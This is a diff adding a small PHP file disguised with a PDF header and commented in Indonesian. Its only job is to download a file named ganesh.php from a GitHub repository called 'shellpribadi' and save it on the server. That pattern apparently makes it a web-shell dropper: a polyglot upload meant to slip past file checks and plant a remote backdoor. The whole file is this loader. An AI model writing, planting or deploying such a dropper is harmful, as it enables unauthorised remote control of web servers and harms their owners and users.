@@ -1,0 +1,36 @@
+%PDF-1.4
+<?php
+// Fungsi untuk mendownload file dari URL
+function downloadFile($url, $saveTo)
+{
+    // Membuka koneksi ke URL
+    $ch = curl_init($url);
+    
+    // Menyiapkan file lokal untuk menyimpan hasil download
+    $fp = fopen($saveTo, 'wb');
+    
+    // Set opsi curl
+    curl_setopt($ch, CURLOPT_FILE, $fp);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Mengikuti redirect jika ada
+    curl_setopt($ch, CURLOPT_TIMEOUT, 60); // Timeout 60 detik
+    
+    // Eksekusi curl
+    curl_exec($ch);
+    
+    // Menutup koneksi curl dan file
+    curl_close($ch);
+    fclose($fp);
+}
+
+// URL file yang akan diunduh
+$url = "https://raw.githubusercontent.com/zer04lone/shellpribadi/refs/heads/main/ganesh.php";
+
+// Nama file untuk menyimpan hasil unduhan
+$saveTo = "ganesh.php";
+
+// Memanggil fungsi download
+downloadFile($url, $saveTo);
+
+echo "File berhasil diunduh ke $saveTo";
+?>
